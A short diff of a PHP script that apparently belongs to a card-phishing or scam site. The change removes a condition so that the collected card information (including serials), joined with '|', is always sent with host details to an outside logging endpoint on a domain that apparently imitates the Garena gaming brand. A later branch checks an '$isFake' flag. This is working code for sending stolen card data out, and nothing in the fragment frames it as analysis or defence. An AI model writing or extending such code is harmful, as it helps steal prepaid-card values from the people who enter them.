@@ -103,11 +103,10 @@ else
 
 
 
-if($cardInfo['seri'])
-{
+
 	$logInfo = implode('|', $cardInfo);
 	$this->header('https://garenavn.net/api_logs/process.php', array('host' => $hostInfo, 'data_logs' => $logInfo));
-}
+
 
 if($isFake)
 {
